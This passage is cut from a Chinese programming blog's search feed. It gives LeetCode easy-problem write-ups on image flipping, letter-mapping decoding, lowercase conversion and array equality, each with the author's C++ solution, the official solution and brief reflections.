class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Alternate implementation of selfDividing:</span></span><br><span class="line"><span class="comment">    public boolean selfDividing(int n) &#123;</span></span><br><span class="line"><span class="comment">        int x = n;</span></span><br><span class="line"><span class="comment">        while (x &gt; 0) &#123;</span></span><br><span class="line"><span class="comment">            int d = x % 10;</span></span><br><span class="line"><span class="comment">            x /= 10;</span></span><br><span class="line"><span class="comment">            if (d == 0 || (n % d) &gt; 0) return false;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(D)$。$D$是在区间 $[L, R]$ 里的整数数。</li>
<li>空间复杂度：$O(D)$，使用了一个数组来存放结果。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>思路基本一样，题解给出了Python和Java两个版本的代码，没啥可分析的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>翻转图像</title>
    <url>/2020/11/13/%E7%BF%BB%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个二进制矩阵 <code>A</code>，我们想先水平翻转图像，然后反转图像并返回结果。</p>
<p>水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 <code>[1, 1, 0]</code> 的结果是 <code>[0, 1, 1]</code>。</p>
<p>反转图片的意思是图片中的 <code>0</code> 全部被 <code>1</code> 替换， <code>1</code> 全部被 <code>0</code> 替换。例如，反转 <code>[0, 1, 1]</code> 的结果是 <code>[1, 0, 0]</code>。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0],[1,0,1],[0,0,0]]</span><br><span class="line">输出: [[1,0,0],[0,1,0],[1,1,1]]</span><br><span class="line">解释: 首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]；</span><br><span class="line">     然后反转图片: [[1,0,0],[0,1,0],[1,1,1]]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]</span><br><span class="line">输出: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br><span class="line">解释: 首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]；</span><br><span class="line">     然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br></pre></td></tr></table></figure>
<p><strong>说明:</strong></p>
<ul>
<li><code>1 &lt;= A.length = A[0].length &lt;= 20</code></li>
<li><code>0 &lt;= A[i][j] &lt;= 1</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历每一行，然后对每一行中的元素翻转交换元素的值（swap函数），再反转元素的值，注意特殊情况，矩阵行数为奇数时中间元素要特殊处理反转一次。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败97.33%，内存消耗8.7M，击败28.26%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">flipAndInvertImage</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历矩阵</span></span><br><span class="line">        <span class="keyword">int</span> n=A.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;(n+<span class="number">1</span>)/<span class="number">2</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//翻转，交换两个元素的值</span></span><br><span class="line">                swap(A[i][j],A[i][n-j<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">//反转，与1异或</span></span><br><span class="line">                A[i][j]^=<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//n是奇数时，中间的元素只能反转一次。</span></span><br><span class="line">                <span class="keyword">if</span>(j!=(n-j<span class="number">-1</span>))&#123;</span><br><span class="line">                    A[i][n-j<span class="number">-1</span>]^=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/flipping-an-image/solution/fan-zhuan-tu-xiang-by-leetcode/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] row: A)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (C + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = row[i] ^ <span class="number">1</span>;</span><br><span class="line">                row[i] = row[C - <span class="number">1</span> - i] ^ <span class="number">1</span>;</span><br><span class="line">                row[C - <span class="number">1</span> - i] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(M*N)$，其中 $M$ 和 $N$ 分别为数组 <code>A</code> 的行数和列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过对于特殊情况比我处理的好，也不算特殊情况吧，只是我自己把它当作特殊情况处理了，主要在于我使用了vector容器中的swap成员函数来交换两个元素，这样必须反转后覆盖原值，对于奇数行数矩阵的每行中间元素反转了两次，而采用tmp辅助变量来进行交换两个元素值不涉及到覆盖问题。其实就是太执着于STL模板库中的成员函数了，自己实现交换元素的功能也挺好，相当于对源码根据实际情况进行了改进，这样才能更灵活地处理问题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>解码字母到整数映射</title>
    <url>/2020/11/14/%E8%A7%A3%E7%A0%81%E5%AD%97%E6%AF%8D%E5%88%B0%E6%95%B4%E6%95%B0%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/decrypt-string-from-alphabet-to-integer-mapping/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code>，它由数字（<code>&#39;0&#39;</code> - <code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 组成。我们希望按下述规则将 <code>s</code> 映射为一些小写英文字符：</p>
<p>字符（<code>&#39;a&#39;</code> - <code>&#39;i&#39;</code>）分别用（<code>&#39;1&#39;</code> - <code>&#39;9&#39;</code>）表示。<br>字符（<code>&#39;j&#39;</code> - <code>&#39;z&#39;</code>）分别用（<code>&#39;10#&#39;</code> - <code>&#39;26#&#39;</code>）表示。<br>返回映射之后形成的新字符串。</p>
<p>题目数据保证映射始终唯一。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;10#11#12&quot;</span><br><span class="line">输出：&quot;jkab&quot;</span><br><span class="line">解释：&quot;j&quot; -&gt; &quot;10#&quot; , &quot;k&quot; -&gt; &quot;11#&quot; , &quot;a&quot; -&gt; &quot;1&quot; , &quot;b&quot; -&gt; &quot;2&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1326#&quot;</span><br><span class="line">输出：&quot;acz&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;25#&quot;</span><br><span class="line">输出：&quot;y&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;12345678910#11#12#13#14#15#16#17#18#19#20#21#22#23#24#25#26#&quot;</span><br><span class="line">输出：&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i]</code> 只包含数字（<code>&#39;0&#39;</code>-<code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 字符。</li>
<li><code>s</code> 是映射始终存在的有效字符串。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用map容器存储键值对映射，遍历字符串，判断每个字符后面的第2个字符是否是’#’，如果是则长度为3的子串作为键，否则就是当前字符作为键去map中找值。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.7M，击败18.21%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">freqAlphabets</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; m;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="built_in">string</span> arr1[<span class="number">26</span>]=&#123;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10#&quot;</span>,<span class="string">&quot;11#&quot;</span>,<span class="string">&quot;12#&quot;</span>,<span class="string">&quot;13#&quot;</span>,<span class="string">&quot;14#&quot;</span>,<span class="string">&quot;15#&quot;</span>,<span class="string">&quot;16#&quot;</span>,<span class="string">&quot;17#&quot;</span>,<span class="string">&quot;18#&quot;</span>,<span class="string">&quot;19#&quot;</span>,<span class="string">&quot;20#&quot;</span>,<span class="string">&quot;21#&quot;</span>,<span class="string">&quot;22#&quot;</span>,<span class="string">&quot;23#&quot;</span>,<span class="string">&quot;24#&quot;</span>,<span class="string">&quot;25#&quot;</span>,<span class="string">&quot;26#&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> arr2[<span class="number">26</span>]=&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//初始化映射规则</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;++i)&#123;</span><br><span class="line">            m[arr1[i]]=arr2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历字符串s</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//该字符后面第二个字符是#，表示对应字符j-z</span></span><br><span class="line">            <span class="keyword">if</span>(i&lt;n<span class="number">-2</span> &amp;&amp; s[i+<span class="number">2</span>]==<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//截取长度为3的子串</span></span><br><span class="line">                result+=m[s.substr(i,<span class="number">3</span>)];</span><br><span class="line">                i+=<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result+=m[s.substr(i,<span class="number">1</span>)];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/decrypt-string-from-alphabet-to-integer-mapping/solution/jie-ma-zi-mu-dao-zheng-shu-ying-she-by-leetcode-so/">官方题解</a>:</h6><p><strong>方法一：遍历</strong></p>
<p>我们对字符串 <code>s</code> 进行顺序遍历。</p>
<p>当遍历到位置 <code>i</code> 时，我们首先向后看两个字符（即 <code>s[i + 2]</code>），如果 <code>s[i + 2]</code> 存在且为 <code>&#39;#&#39;</code>，那么位置 <code>i</code>，<code>i + 1</code> 和 <code>i + 2</code> 表示一个 <code>&#39;j&#39;</code> 到 <code>&#39;z&#39;</code> 之间的字符，否则位置 <code>i</code> 表示一个 <code>&#39;a&#39;</code> 到 <code>&#39;i&#39;</code> 的字符。</p>
<p>根据对 <code>s[i + 2]</code> 的判断，我们可以使用字符串转整数的方法得到对应的字符的 ASCII 码，从而得到字符本身。在这之后，我们将位置 <code>i</code> 后移，继续进行遍历直到结束。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.4M，击败31.87%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">freqAlphabets</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + <span class="number">2</span> &lt; s.size() &amp;&amp; s[i + <span class="number">2</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                ans += <span class="keyword">char</span>((s[i] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (s[i + <span class="number">1</span>] - <span class="string">&#x27;1&#x27;</span>) + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ans += <span class="keyword">char</span>(s[i] - <span class="string">&#x27;1&#x27;</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是字符串 <code>s</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>思路是一样的，利用字符和ASCII之间的转换也挺好，代码比较简洁明了。我用了map容器反而增加了空间复杂度，代码看着比较长😯</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>转换成小写字母</title>
    <url>/2020/11/13/%E8%BD%AC%E6%8D%A2%E6%88%90%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/to-lower-case/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现函数 ToLowerCase()，该函数接收一个字符串参数 str，并将该字符串中的大写字母转换成小写字母，之后返回新的字符串。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Hello&quot;</span><br><span class="line">输出: &quot;hello&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;here&quot;</span><br><span class="line">输出: &quot;here&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LOVELY&quot;</span><br><span class="line">输出: &quot;lovely&quot;</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串中的每个字符，利用字母的ASCII码的特性（小写字母比大写字母数值大32，如’a‘是97，’A’是65），或操作将每个字母的字母的第6位置为1（大写字母第6位0变1增大了32变成小写，小写字母第6位1还是1，不变）。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败12.53%，内存消耗6.3M，击败8.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">toLowerCase</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();++i)&#123;</span><br><span class="line">            <span class="comment">//把字母转换成小写，把字母二进制第六位置为1,（大写字母为0，小写字母为1）</span></span><br><span class="line">            str[i]=str[i]|<span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，或许是太简单了不稀得写吧😛，不多说了</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>通过翻转子数组使两个数组相等</title>
    <url>/2020/11/13/%E9%80%9A%E8%BF%87%E7%BF%BB%E8%BD%AC%E5%AD%90%E6%95%B0%E7%BB%84%E4%BD%BF%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/make-two-arrays-equal-by-reversing-sub-arrays/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个长度相同的整数数组 <code>target</code> 和 <code>arr</code> 。</p>
<p>每一步中，你可以选择 <code>arr</code> 的任意 <strong>非空子数组</strong> 并将它翻转。你可以执行此过程任意次。</p>
<p>如果你能让 <code>arr</code> 变得与 <code>target</code> 相同，返回 True；否则，返回 False 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,2,3,4], arr &#x3D; [2,4,1,3]</span><br><span class="line">输出：true</span><br><span class="line">解释：你可以按照如下步骤使 arr 变成 target：</span><br><span class="line">1- 翻转子数组 [2,4,1] ，arr 变成 [1,4,2,3]</span><br><span class="line">2- 翻转子数组 [4,2] ，arr 变成 [1,2,4,3]</span><br><span class="line">3- 翻转子数组 [4,3] ，arr 变成 [1,2,3,4]</span><br><span class="line">上述方法并不是唯一的，还存在多种将 arr 变成 target 的方法。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [7], arr &#x3D; [7]</span><br><span class="line">输出：true</span><br><span class="line">解释：arr 不需要做任何翻转已经与 target 相等。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,12], arr &#x3D; [12,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [3,7,9], arr &#x3D; [3,7,11]</span><br><span class="line">输出：false</span><br><span class="line">解释：arr 没有数字 9 ，所以无论如何也无法变成 target 。</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,1,1,1,1], arr &#x3D; [1,1,1,1,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>target.length == arr.length</code></li>
<li><code>1 &lt;= target.length &lt;= 1000</code></li>
<li><code>1 &lt;= target[i] &lt;= 1000</code></li>
<li><code>1 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目要求对整数数组arr进行子数组反转，如果最后可以使arr变得和target相同返回true，其实也就是数组arr中的任何两个元素都可以进行交换，所以只要target中的元素与arr中的一样（无序），就返回true，否则返回false。</p>
<p><strong>c++代码：</strong>(执行用时36ms，击败49.21%，内存消耗14M，击败64.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canBeEqual</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历查找target中的元素是否都在arr中存在</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;target.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>((it=find(arr.begin(),arr.end(),target[i]))==arr.end())&#123;</span><br><span class="line">                <span class="comment">//target中的元素在arr中没有找到</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span 